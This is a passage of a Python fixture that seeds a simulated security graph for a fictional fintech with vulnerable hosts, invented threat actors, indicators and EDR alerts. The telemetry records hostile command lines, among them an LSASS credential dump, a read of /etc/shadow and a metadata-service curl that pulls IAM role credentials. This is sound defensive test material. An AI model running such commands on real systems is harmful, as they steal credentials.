    for cid in ("CVE-2021-44228", "CVE-2024-3400", "CVE-2023-22515", "CVE-2024-21887", "CVE-2023-46805", "CVE-2022-22965", "CVE-2023-4966", "CVE-2024-6387"):
        cve(cid)
    n(sc.EDGE_LOG4J_PACKAGE, "Package", "log4j-core 2.14.1", {"package_name": "log4j-core", "version": "2.14.1", "ecosystem": "maven", "scope": sc.EDGE_INSTANCE_ID})
    n(sc.EDGE_IMAGE, "ContainerImage", "larkspur/statement-render:3.8.1", {"registry": "ecr", "repository": "larkspur/statement-render", "tag": "3.8.1", "digest": "sha256:deadbeef", "vuln_count_critical": 1, "vuln_count_high": 3})
    e("HAS_PACKAGE", sc.EDGE_VM, sc.EDGE_LOG4J_PACKAGE)
    e("HAS_PACKAGE", sc.EDGE_IMAGE, sc.EDGE_LOG4J_PACKAGE)
    e("RUNS_IMAGE", sc.EDGE_VM, sc.EDGE_IMAGE)
    e("HAS_VULNERABILITY", sc.EDGE_LOG4J_PACKAGE, sc.LOG4SHELL, {"fixed_version": "2.17.1"})
    for vid in (sc.EDGE_VM, sc.STG_EDGE_VM, sc.DEV_LOG4J_VM):
        e("VULNERABLE_TO", vid, sc.LOG4SHELL, {"via_package": "log4j-core 2.14.1", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", sc.EDGE_IMAGE, sc.LOG4SHELL, {"via_package": "log4j-core 2.14.1", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", VPN_GW_VM, "cve:CVE-2024-3400", {"via_package": "pan-os-globalprotect", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", WIKI_VM, "cve:CVE-2023-22515", {"via_package": "confluence-server 8.5.0", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", ICS_VM, "cve:CVE-2024-21887", {"via_package": "ivanti-connect-secure", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", ICS_VM, "cve:CVE-2023-46805", {"via_package": "ivanti-connect-secure", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", CANARY_VM, "cve:CVE-2022-22965", {"via_package": "spring-beans 5.3.10", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", CITRIX_VM, "cve:CVE-2023-4966", {"via_package": "citrix-netscaler-gateway", "exploitable": True}, source="derived")
    e("VULNERABLE_TO", sc.BASTION_VM, "cve:CVE-2024-6387", {"via_package": "openssh-server 9.6p1", "exploitable": False}, source="derived")

    # ------------------------------------------------------------------ endpoints
    def endpoint(eid: str, hostname: str, *, device_type: str, os: str, os_family: str, private_ip: str, site: str | None = None, vm_id: str | None = None,
                 account: str | None = None, primary_user: str | None = None, same_as_conf: float = 0.99, method: str = "instance_id") -> str:
        props = {"hostname": hostname, "device_type": device_type, "os": os, "os_family": os_family, "private_ip": private_ip, "site": site, "sensor_version": "7.18", "last_seen_sensor": "2026-09-11T13:58:00Z", "containment_status": "normal", "primary_user_id": primary_user}
        if vm_id:
            props.update({"cloud_provider": "aws", "cloud_instance_id": vm_id.rsplit(":", 1)[-1], "cloud_account_id": account})
        n(eid, "Endpoint", hostname, props, source="falcon-sim")
        if vm_id:
            e("SAME_AS", eid, vm_id, {"method": method}, source="derived", confidence=same_as_conf)
        if primary_user:
            e("PRIMARY_USER", eid, primary_user, source="falcon-sim")
        return eid

    endpoint(sc.WKS_DANA, sc.WKS_DANA_HOSTNAME, device_type="workstation", os="Windows 11", os_family="windows", private_ip=sc.WKS_DANA_IP, site="Boston office", primary_user=sc.USER_DANA)
    endpoint(sc.EP_BASTION, sc.BASTION_NAME, device_type="server", os="Amazon Linux 2023", os_family="linux", private_ip=sc.BASTION_PRIVATE_IP, vm_id=sc.BASTION_VM, account="222222222222")
    endpoint(sc.EP_EDGE, sc.EDGE_NAME, device_type="server", os="Ubuntu 22.04", os_family="linux", private_ip=sc.EDGE_PRIVATE_IP, vm_id=sc.EDGE_VM, account="111111111111")
    endpoint(sc.EP_DEV_SANDBOX, sc.DEV_SANDBOX_NAME, device_type="server", os="Amazon Linux 2023", os_family="linux", private_ip="10.44.9.3", vm_id=sc.DEV_SANDBOX_VM, account="444444444444")
    endpoint(sc.EP_FILESHARE, sc.FILESHARE_NAME, device_type="server", os="Windows Server 2022", os_family="windows", private_ip="10.60.2.15", vm_id=sc.FILESHARE_VM, account="666666666666")
    endpoint(sc.EP_MREYES, sc.EP_MREYES_HOSTNAME, device_type="workstation", os="Windows 11", os_family="windows", private_ip=MREYES_IP, site="Boston office", primary_user=sc.USER_MREYES)
    endpoint(sc.EP_PKAUR, sc.EP_PKAUR_HOSTNAME, device_type="workstation", os="macOS 15", os_family="macos", private_ip="10.40.13.20", site="New York office", primary_user=sc.USER_PKAUR)
    endpoint(EP_JOKAFOR, "WKS-4410", device_type="workstation", os="macOS 15", os_family="macos", private_ip="10.40.12.90", site="Boston office", primary_user=sc.USER_JOKAFOR)
    endpoint(EP_LCHEN, "WKS-4411", device_type="workstation", os="Windows 11", os_family="windows", private_ip="10.40.12.91", site="Boston office", primary_user=sc.USER_LCHEN)
    endpoint(EP_STG, sc.STG_EDGE_NAME, device_type="server", os="Ubuntu 22.04", os_family="linux", private_ip="10.30.3.24", vm_id=sc.STG_EDGE_VM, account="333333333333")
    endpoint(EP_SCANNER, sc.SCANNER_NAME, device_type="server", os="Amazon Linux 2023", os_family="linux", private_ip=sc.SCANNER_IP, vm_id=sc.SCANNER_VM, account="222222222222")
    endpoint(EP_CANARY, "payments-api-canary", device_type="server", os="Ubuntu 22.04", os_family="linux", private_ip="10.10.5.40", vm_id=CANARY_VM, account="111111111111")
    endpoint(EP_WIKI, "wiki-confluence-01", device_type="server", os="Ubuntu 22.04", os_family="linux", private_ip="10.60.4.20", vm_id=WIKI_VM, account="666666666666", same_as_conf=0.9, method="hostname_ip")
    for i, eid in enumerate(EP_APP):
        endpoint(eid, f"wallet-api-{i + 1:02d}", device_type="server", os="Amazon Linux 2023", os_family="linux", private_ip=f"10.10.2.{10 + i}", vm_id=APP_VMS[i], account="111111111111")
    for i, eid in enumerate(QUARANTINE_EPS):
        endpoint(eid, f"WKS-5{i + 1:03d}", device_type="workstation", os="Windows 11", os_family="windows", private_ip=f"10.40.20.{10 + i}", site="Boston office", primary_user=QUARANTINE_USERS[i])

    # ------------------------------------------------------------------ threat intelligence
    def actor(aid: str, name: str, motivation: str, sectors: list[str], relevance: float, active: bool = True) -> str:
        return n(aid, "ThreatActor", name, {"aliases": [], "motivation": motivation, "origin": "unknown", "sophistication": "high", "targeted_sectors": sectors, "targeted_regions": ["north-america", "western-europe"], "sector_targeting_relevance": relevance, "active": active, "description": f"{name} ({motivation})"}, source="ti-sim")

    def campaign(cid: str, name: str, actor_id: str, started: str, relevance: float, sectors: list[str], status: str = "active") -> str:
        n(cid, "Campaign", name, {"actor_id": actor_id, "status": status, "started": started, "objective": "financial gain", "targeted_sectors": sectors, "sector_targeting_relevance": relevance, "description": name}, source="ti-sim")
        e("ATTRIBUTED_TO", cid, actor_id, {"basis": "report", "confidence": 0.9}, source="ti-sim")
        return cid

    def indicator(iid: str, ioc_type: str, value: str, conf: float, *, report: str, actor_id: str, campaign_id: str, malware_id: str | None = None, stage: int = 6, active: bool = True, first_seen: str = "2026-07-15T00:00:00Z") -> str:
        n(iid, "Indicator", value, {"ioc_type": ioc_type, "value": value, "confidence": conf, "report_id": report, "actor_id": actor_id, "campaign_id": campaign_id, "malware_id": malware_id, "kill_chain_stage": stage, "active": active}, source="ti-sim", first_seen=first_seen, last_seen="2026-09-10T00:00:00Z", confidence=conf)
        if malware_id:
            e("INDICATES", iid, malware_id, source="ti-sim", confidence=conf)
        e("INDICATES", iid, campaign_id, source="ti-sim", confidence=conf)
        return iid

    fin = ["financial-services", "payments"]
    actor(sc.ACTOR_CJ, "Cinder Jackal", "financial", fin, 0.9)
    actor(sc.ACTOR_HT, "Hollow Tide", "access-broker", fin, 0.8)
    actor(ACTOR_GH, "Gravel Heron", "financial", fin, 0.75)
    actor(ACTOR_BF, "Brine Fox", "access-broker", fin, 0.7)
    actor(ACTOR_SM, "Slate Mantis", "espionage", ["technology"], 0.2)
    actor(ACTOR_AC, "Ash Cormorant", "financial", ["healthcare"], 0.3)
    campaign(sc.CAMPAIGN_EMBERCAST, "EMBERCAST", sc.ACTOR_CJ, "2026-07-01T00:00:00Z", 0.9, fin)
    campaign(sc.CAMPAIGN_SALTWORKS, "SALTWORKS", sc.ACTOR_HT, "2026-08-20T00:00:00Z", 0.8, fin)
    campaign(CAMPAIGN_GG, "GRANITE GATE", ACTOR_GH, "2026-06-10T00:00:00Z", 0.75, fin)
    campaign(CAMPAIGN_TW, "TIDEWRACK", ACTOR_BF, "2026-08-01T00:00:00Z", 0.7, fin)
    campaign(CAMPAIGN_SR, "SLATE RUN", ACTOR_SM, "2026-05-01T00:00:00Z", 0.2, ["technology"])
    campaign(CAMPAIGN_AT, "ASH TIDE", ACTOR_AC, "2026-04-01T00:00:00Z", 0.3, ["healthcare"])
    campaign(CAMPAIGN_OLD, "DRIFTWOOD", ACTOR_SM, "2025-02-01T00:00:00Z", 0.2, ["technology"], status="historical")
    for mid, fam, mtype in ((sc.MALWARE_MAPLELOADER, "MAPLELOADER", "loader"), (sc.MALWARE_QUILLDROP, "QUILLDROP", "stealer"), (sc.MALWARE_NIGHTFERRY, "NIGHTFERRY", "implant"), (sc.MALWARE_BRACKISH, "BRACKISH", "webshell")):
        n(mid, "Malware", fam, {"family": fam, "malware_type": mtype, "platforms": ["windows"] if mid != sc.MALWARE_BRACKISH else ["linux"], "description": fam}, source="ti-sim")
    for mid in (sc.MALWARE_MAPLELOADER, sc.MALWARE_QUILLDROP, sc.MALWARE_NIGHTFERRY):
        e("USES_MALWARE", sc.ACTOR_CJ, mid, source="ti-sim")
        e("USES_MALWARE", sc.CAMPAIGN_EMBERCAST, mid, source="ti-sim")
    e("USES_MALWARE", sc.ACTOR_HT, sc.MALWARE_BRACKISH, source="ti-sim")
    e("USES_MALWARE", sc.CAMPAIGN_SALTWORKS, sc.MALWARE_BRACKISH, source="ti-sim")
    indicator(sc.IOC_C2_DOMAIN, "domain", sc.C2_DOMAIN, 0.95, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_NIGHTFERRY)
    indicator(sc.IOC_C2_IP, "ipv4", sc.C2_IP, 0.9, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_NIGHTFERRY)
    indicator(sc.IOC_EGRESS_IP, "ipv4", sc.ATTACKER_EGRESS_IP, 0.85, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, stage=5)
    indicator(sc.IOC_HASH_MAPLELOADER, "sha256", sc.HASH_MAPLELOADER, 0.95, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_MAPLELOADER, stage=2)
    indicator(sc.IOC_HASH_QUILLDROP, "sha256", sc.HASH_QUILLDROP, 0.9, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_QUILLDROP, stage=4)
    indicator(sc.IOC_HASH_NIGHTFERRY, "sha256", sc.HASH_NIGHTFERRY, 0.95, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_NIGHTFERRY, stage=3)
    indicator(sc.IOC_FILENAME_SYNCHOST, "filename", "synchost.exe", 0.6, report=sc.REPORT_EMBERCAST, actor_id=sc.ACTOR_CJ, campaign_id=sc.CAMPAIGN_EMBERCAST, malware_id=sc.MALWARE_NIGHTFERRY, stage=3)
    indicator(sc.IOC_SALTWORKS_IP, "ipv4", sc.SALTWORKS_IP, 0.8, report=sc.REPORT_SALTWORKS, actor_id=sc.ACTOR_HT, campaign_id=sc.CAMPAIGN_SALTWORKS, stage=1, first_seen="2026-08-20T00:00:00Z")
    indicator(sc.IOC_HASH_BRACKISH, "sha256", sc.HASH_BRACKISH, 0.85, report=sc.REPORT_SALTWORKS, actor_id=sc.ACTOR_HT, campaign_id=sc.CAMPAIGN_SALTWORKS, malware_id=sc.MALWARE_BRACKISH, stage=3, first_seen="2026-08-20T00:00:00Z")
    indicator(sc.IOC_BRACKISH_URL, "url", sc.BRACKISH_URL, 0.8, report=sc.REPORT_SALTWORKS, actor_id=sc.ACTOR_HT, campaign_id=sc.CAMPAIGN_SALTWORKS, malware_id=sc.MALWARE_BRACKISH, stage=2, first_seen="2026-08-20T00:00:00Z")
    indicator(IOC_OLD_IP, "ipv4", OLD_IOC_IP, 0.4, report=REPORT_OLD, actor_id=ACTOR_SM, campaign_id=CAMPAIGN_OLD, stage=6, active=False, first_seen="2025-02-10T00:00:00Z")
    indicator("ioc:ipv4:198.51.100.199", "ipv4", "198.51.100.199", 0.35, report=REPORT_OLD, actor_id=ACTOR_SM, campaign_id=CAMPAIGN_OLD, stage=6, active=False, first_seen="2025-02-10T00:00:00Z")
    n(sc.REPORT_EMBERCAST, "IntelReport", "EMBERCAST: Cinder Jackal shifts to bastion-host pivoting against fintech cloud estates", {"title": "EMBERCAST: Cinder Jackal shifts to bastion-host pivoting against fintech cloud estates", "published": "2026-09-02T00:00:00Z", "publisher": "Throughline Labs", "report_confidence": "high", "tlp": "amber", "summary": "Cinder Jackal is actively operating EMBERCAST against fintechs.", "actor_ids": [sc.ACTOR_CJ], "campaign_ids": [sc.CAMPAIGN_EMBERCAST], "cve_ids": [], "technique_ids": sc.CJ_TECHNIQUES, "indicator_count": 7, "targeted_sectors": fin, "body": "Fictional narrative."}, source="ti-sim", first_seen="2026-09-02T00:00:00Z")
    n(sc.REPORT_SALTWORKS, "IntelReport", "SALTWORKS: Hollow Tide mass-exploits Log4Shell in fintech statement and document services", {"title": "SALTWORKS: Hollow Tide mass-exploits Log4Shell in fintech statement and document services", "published": "2026-09-08T00:00:00Z", "publisher": "Throughline Labs", "report_confidence": "medium-high", "tlp": "amber", "summary": "Mass exploitation of CVE-2021-44228 against financial services.", "actor_ids": [sc.ACTOR_HT], "campaign_ids": [sc.CAMPAIGN_SALTWORKS], "cve_ids": ["CVE-2021-44228"], "technique_ids": sc.HT_TECHNIQUES, "indicator_count": 3, "targeted_sectors": fin, "body": "Fictional narrative."}, source="ti-sim", first_seen="2026-09-08T00:00:00Z")
    n(REPORT_GG, "IntelReport", "GRANITE GATE: edge appliance exploitation against banks", {"title": "GRANITE GATE: edge appliance exploitation against banks", "published": "2026-08-25T00:00:00Z", "publisher": "Throughline Labs", "report_confidence": "medium", "tlp": "amber", "summary": "Gravel Heron and Brine Fox exploit VPN and gateway appliances.", "actor_ids": [ACTOR_GH, ACTOR_BF], "campaign_ids": [CAMPAIGN_GG, CAMPAIGN_TW], "cve_ids": ["CVE-2024-3400", "CVE-2023-4966", "CVE-2024-21887", "CVE-2023-46805"], "technique_ids": ["T1190", "T1133"], "indicator_count": 0, "targeted_sectors": fin, "body": "Fictional narrative."}, source="ti-sim", first_seen="2026-08-25T00:00:00Z")
    n(REPORT_OLD, "IntelReport", "DRIFTWOOD retrospective", {"title": "DRIFTWOOD retrospective", "published": "2025-03-01T00:00:00Z", "publisher": "Throughline Labs", "report_confidence": "low", "tlp": "white", "summary": "Historical infrastructure of Slate Mantis.", "actor_ids": [ACTOR_SM], "campaign_ids": [CAMPAIGN_OLD], "cve_ids": [], "technique_ids": [], "indicator_count": 2, "targeted_sectors": ["technology"], "body": "Fictional narrative."}, source="ti-sim", first_seen="2025-03-01T00:00:00Z")
    for rid, targets in (
        (sc.REPORT_EMBERCAST, [sc.ACTOR_CJ, sc.CAMPAIGN_EMBERCAST, sc.MALWARE_MAPLELOADER, sc.MALWARE_QUILLDROP, sc.MALWARE_NIGHTFERRY, sc.IOC_C2_DOMAIN, sc.IOC_C2_IP, sc.IOC_EGRESS_IP, sc.IOC_HASH_MAPLELOADER, sc.IOC_HASH_QUILLDROP, sc.IOC_HASH_NIGHTFERRY, sc.IOC_FILENAME_SYNCHOST]),
        (sc.REPORT_SALTWORKS, [sc.ACTOR_HT, sc.CAMPAIGN_SALTWORKS, sc.MALWARE_BRACKISH, sc.LOG4SHELL, sc.IOC_SALTWORKS_IP, sc.IOC_HASH_BRACKISH, sc.IOC_BRACKISH_URL]),
        (REPORT_GG, [ACTOR_GH, ACTOR_BF, CAMPAIGN_GG, CAMPAIGN_TW, "cve:CVE-2024-3400", "cve:CVE-2023-4966", "cve:CVE-2024-21887", "cve:CVE-2023-46805"]),
        (REPORT_OLD, [ACTOR_SM, CAMPAIGN_OLD, IOC_OLD_IP, "ioc:ipv4:198.51.100.199"]),
    ):
        for t in targets:
            e("REPORTS_ON", rid, t, source="ti-sim")
    e("EXPLOITS", sc.CAMPAIGN_SALTWORKS, sc.LOG4SHELL, {"status": "mass_exploitation", "first_seen": "2026-08-20T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", sc.ACTOR_HT, sc.LOG4SHELL, {"status": "mass_exploitation", "first_seen": "2026-08-20T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_GG, "cve:CVE-2024-3400", {"status": "active", "first_seen": "2026-06-12T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_GG, "cve:CVE-2023-4966", {"status": "active", "first_seen": "2026-06-20T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_TW, "cve:CVE-2024-21887", {"status": "mass_exploitation", "first_seen": "2026-08-05T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_TW, "cve:CVE-2023-46805", {"status": "mass_exploitation", "first_seen": "2026-08-05T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_SR, "cve:CVE-2023-22515", {"status": "active", "first_seen": "2026-05-15T00:00:00Z"}, source="ti-sim")
    e("EXPLOITS", CAMPAIGN_AT, "cve:CVE-2022-22965", {"status": "active", "first_seen": "2026-04-15T00:00:00Z"}, source="ti-sim")
    for t in sc.CJ_TECHNIQUES:
        tn = b.technique(t)
        e("USES_TECHNIQUE", sc.ACTOR_CJ, tn, source="ti-sim")
        e("USES_TECHNIQUE", sc.CAMPAIGN_EMBERCAST, tn, source="ti-sim")
    for t in sc.HT_TECHNIQUES:
        tn = b.technique(t)
        e("USES_TECHNIQUE", sc.ACTOR_HT, tn, source="ti-sim")
        e("USES_TECHNIQUE", sc.CAMPAIGN_SALTWORKS, tn, source="ti-sim")
    for t in ("T1190", "T1133"):
        for who in (ACTOR_GH, ACTOR_BF, CAMPAIGN_GG, CAMPAIGN_TW):
            e("USES_TECHNIQUE", who, b.technique(t), source="ti-sim")

    # ------------------------------------------------------------------ storyline A telemetry (WKS-3391)
    c2_domain = n(DOM.format(sc.C2_DOMAIN), "Domain", sc.C2_DOMAIN, {"fqdn": sc.C2_DOMAIN, "registered_days_ago": 41, "reputation": "unknown"}, source="falcon-sim")
    c2_ip = b.ip(sc.C2_IP, asn="AS64500", asn_org=sc.ATTACKER_ASN_ORG, country="NL", reputation="suspicious")
    egress_ip = b.ip(sc.ATTACKER_EGRESS_IP, asn=sc.ATTACKER_ASN, asn_org=sc.ATTACKER_ASN_ORG, country="NL", reputation="unknown")
    dana_ip = b.ip(sc.WKS_DANA_IP)
    e("RESOLVES_TO", c2_domain, c2_ip, source="falcon-sim")

    def process(pid_str: str, ep: str, image: str, cmd: str, user: str, start: str, sha: str | None = None, *, signed: bool = True, ran_as: str | None = None) -> str:
        pid = int(pid_str.split(":")[0])
        nid = f"process:falcon:{ep.rsplit(':', 1)[-1]}:{pid_str.replace(':', ':')}"
        n(nid, "Process", image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1], {"endpoint_id": ep, "pid": pid, "image_path": image, "command_line": cmd, "user": user, "sha256": sha, "signed": signed, "signer": "Microsoft Windows" if signed else None, "start_time": start, "integrity_level": "medium"}, source="falcon-sim", first_seen=start, last_seen=start)
        e("RAN_ON", nid, ep, source="falcon-sim", first_seen=start, last_seen=start)
        if ran_as:
            e("RAN_AS", nid, ran_as, source="falcon-sim")
        return nid

    def file(sha: str, name: str, path: str, family: str | None, verdict: str) -> str:
        return n(f"file:sha256:{sha}", "File", name, {"sha256": sha, "file_name": name, "file_path": path, "size_bytes": 184320, "signed": False, "malware_family": family, "verdict": verdict}, source="falcon-sim")

    a = sc.ALERT_A
    f_maple = file(sc.HASH_MAPLELOADER, "mpl.dll", r"C:\Users\dwhitfield\AppData\Local\Temp\mpl.dll", "MAPLELOADER", "malicious")
    f_night = file(sc.HASH_NIGHTFERRY, "synchost.exe", r"C:\ProgramData\Microsoft\SyncHost\synchost.exe", "NIGHTFERRY", "malicious")
    f_quill = file(sc.HASH_QUILLDROP, "qd.exe", r"C:\Users\dwhitfield\AppData\Local\Temp\qd.exe", "QUILLDROP", "malicious")
    p_ps = process("5100:1788945120", sc.WKS_DANA, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -w hidden -enc ...", "CORP\\dwhitfield", a["a001"][1], ran_as=sc.USER_DANA)
    p_rundll = process("5124:1788945124", sc.WKS_DANA, r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Users\dwhitfield\AppData\Local\Temp\mpl.dll,Start", "CORP\\dwhitfield", a["a001"][1], ran_as=sc.USER_DANA)
    p_sync = process("5300:1788945270", sc.WKS_DANA, r"C:\ProgramData\Microsoft\SyncHost\synchost.exe", "synchost.exe", "CORP\\dwhitfield", a["a002"][1], sha=sc.HASH_NIGHTFERRY, signed=False, ran_as=sc.USER_DANA)
    p_qd = process("6011:1788967361", sc.WKS_DANA, r"C:\Users\dwhitfield\AppData\Local\Temp\qd.exe", "qd.exe -p lsass", "CORP\\dwhitfield", a["a004"][1], sha=sc.HASH_QUILLDROP, signed=False, ran_as=sc.USER_DANA)
    p_net = process("6200:1788968400", sc.WKS_DANA, r"C:\Windows\System32\net.exe", 'net group "Domain Admins" /domain', "CORP\\dwhitfield", a["a006"][1], ran_as=sc.USER_DANA)
    e("SPAWNED", p_ps, p_rundll, source="falcon-sim")
    e("SPAWNED", p_rundll, p_sync, source="falcon-sim")
    e("EXECUTED", p_rundll, f_maple, {"action": "loaded"}, source="falcon-sim")
    e("EXECUTED", p_rundll, f_night, {"action": "wrote"}, source="falcon-sim")
    e("EXECUTED", p_sync, f_night, {"action": "executed"}, source="falcon-sim")
    e("EXECUTED", p_qd, f_quill, {"action": "executed"}, source="falcon-sim")
    e("CONNECTED_TO", p_sync, c2_domain, {"port": 443, "protocol": "tcp", "direction": "outbound", "count": 120, "bytes_out": 480000, "first_time": "2026-09-09T09:15:00Z", "last_time": "2026-09-10T02:00:00Z"}, source="falcon-sim")
    e("CONNECTED_TO", p_sync, c2_ip, {"port": 443, "protocol": "tcp", "direction": "outbound", "count": 120, "bytes_out": 480000, "first_time": "2026-09-09T09:15:00Z", "last_time": "2026-09-10T02:00:00Z"}, source="falcon-sim")
    n(sc.CRED_SSH_KEY, "Credential", "dwhitfield id_ed25519", {"credential_type": "ssh_private_key", "principal_id": sc.SVC_FINOPS_SFTP, "issued_at": "2025-06-01T00:00:00Z", "expires_at": None, "status": "valid", "derived_from": None}, source="falcon-sim", first_seen=a["a005"][1])
    e("CREDENTIAL_FOR", sc.CRED_SSH_KEY, sc.SVC_FINOPS_SFTP, source="falcon-sim")
    e("ACCESSED_CREDENTIAL", p_qd, sc.CRED_SSH_KEY, {"method": "file_read"}, source="falcon-sim")
    e("STOLEN_BY", sc.CRED_SSH_KEY, p_qd, {"method": "file_read"}, source="derived")
    for inc, hosts, start, end, count in ((sc.INCIDENT_WKS, [sc.WKS_DANA_HOSTNAME], a["a001"][1], a["a006"][1], 6), (sc.INCIDENT_BASTION, [sc.BASTION_NAME], a["a007"][1], a["a009"][1], 3), (sc.INCIDENT_EDGE, [sc.EDGE_NAME], sc.ALERT_B["b002"][1], sc.ALERT_B["b003"][1], 2)):
        n(inc, "Incident", inc.rsplit(":", 1)[-1], {"vendor_severity": "high", "status": "new", "start_time": start, "end_time": end, "alert_count": count, "hosts": hosts, "description": "EDR incident"}, source="falcon-sim", first_seen=start, last_seen=end)

    b.alert(a["a001"][0], "Malicious file execution via LNK in mounted ISO", a["a001"][2], a["a001"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1566.001", "T1204.002", "T1059.001", "T1218.011"], tactic="Initial Access", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_ps, "subject"), (p_rundll, "subject"), (f_maple, "object"), (sc.USER_DANA, "subject")])
    b.alert(a["a002"][0], "Run-key persistence by recently written binary", a["a002"][2], a["a002"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1547.001", "T1055"], tactic="Persistence", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_sync, "subject"), (f_night, "object")])
    b.alert(a["a003"][0], "Periodic outbound connections to rare domain", a["a003"][2], a["a003"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1071.001", "T1573.002"], tactic="Command and Control", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_sync, "subject"), (c2_domain, "destination"), (c2_ip, "destination")])
    b.alert(a["a004"][0], "Credential dumping technique observed (LSASS memory read)", a["a004"][2], a["a004"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1003.001"], tactic="Credential Access", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_qd, "subject"), (f_quill, "object")])
    b.alert(a["a005"][0], "Access to SSH private key by unsigned process", a["a005"][2], a["a005"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1552.001"], tactic="Credential Access", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_qd, "subject"), (sc.CRED_SSH_KEY, "credential")])
    e("STOLEN_BY", sc.CRED_SSH_KEY, a["a005"][0], {"method": "file_read"}, source="derived")
    b.alert(a["a006"][0], "Account and remote-system discovery", a["a006"][2], a["a006"][1], source_system="falcon", alert_type="detection", anchor=sc.WKS_DANA, techniques=["T1087.002", "T1018"], tactic="Discovery", hostname=sc.WKS_DANA_HOSTNAME, user="dwhitfield", incident=sc.INCIDENT_WKS, involves=[(p_net, "subject")])

    # ------------------------------------------------------------------ storyline A telemetry (bas-01)
    p_shell = process("2210:1789005917", sc.EP_BASTION, "/usr/bin/bash", "-bash", "svc-finops-sftp", a["a007"][1], ran_as=sc.SVC_FINOPS_SFTP)
    p_cat = process("2240:1789006142", sc.EP_BASTION, "/usr/bin/cat", "cat /etc/shadow", "root", a["a008x"][1], ran_as=sc.SVC_FINOPS_SFTP)
    p_curl = process("2288:1789006305", sc.EP_BASTION, "/usr/bin/curl", "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole", "svc-finops-sftp", a["a009"][1], ran_as=sc.SVC_FINOPS_SFTP)
    e("SPAWNED", p_shell, p_cat, source="falcon-sim")
    e("SPAWNED", p_shell, p_curl, source="falcon-sim")
    e("LOGGED_ON", sc.SVC_FINOPS_SFTP, sc.EP_BASTION, {"logon_type": "ssh", "logon_time": a["a007"][1], "source_ip": sc.WKS_DANA_IP, "session_id": "ssh-7f3a"}, source="falcon-sim", first_seen=a["a007"][1], last_seen=a["a007"][1])
    e("LOGGED_ON", sc.SVC_FINOPS_SFTP, sc.EP_BASTION, {"logon_type": "ssh", "logon_time": "2026-09-05T03:00:00Z", "source_ip": sc.WKS_DANA_IP, "session_id": "sftp-routine"}, source="falcon-sim", first_seen="2026-09-05T03:00:00Z", last_seen="2026-09-05T03:00:00Z")
    e("LOGGED_ON", sc.USER_DANA, sc.WKS_DANA, {"logon_type": "interactive", "logon_time": "2026-09-09T08:30:00Z", "source_ip": None, "session_id": "wks-1"}, source="falcon-sim", first_seen="2026-09-09T08:30:00Z", last_seen="2026-09-09T08:30:00Z")
    b.alert(a["a007"][0], "Interactive SSH session from user workstation to bastion outside business hours", a["a007"][2], a["a007"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_BASTION, techniques=["T1021.004", "T1078"], tactic="Lateral Movement", hostname=sc.BASTION_NAME, user="svc-finops-sftp", incident=sc.INCIDENT_BASTION, extra={"source_ip": sc.WKS_DANA_IP}, involves=[(p_shell, "subject"), (dana_ip, "source"), (sc.SVC_FINOPS_SFTP, "subject")])
    b.alert(a["a008x"][0], "Read of /etc/shadow via sudo", a["a008x"][2], a["a008x"][1], source_system="falcon", alert_type="detection", anchor=sc.EP_BASTION, techniques=["T1003.008"], tactic="Credential Access", hostname=sc.BASTION_NAME, user="svc-finops-sftp", incident=sc.INCIDENT_BASTION, involves=[(p_cat, "subject")])
    n(sc.CRED_BASTION_KEY, "Credential", sc.CRED_BASTION_KEY_ID, {"credential_type": "aws_temporary_key", "principal_id": sc.BASTION_ROLE, "issued_at": a["a009"][1], "expires_at": "2026-09-10T08:11:45Z", "status": "expired", "derived_from": None}, source="falcon-sim", first_seen=a["a009"][1])
    e("CREDENTIAL_FOR", sc.CRED_BASTION_KEY, sc.BASTION_ROLE, source="falcon-sim")
    e("ACCESSED_CREDENTIAL", p_curl, sc.CRED_BASTION_KEY, {"method": "imds"}, source="falcon-sim")
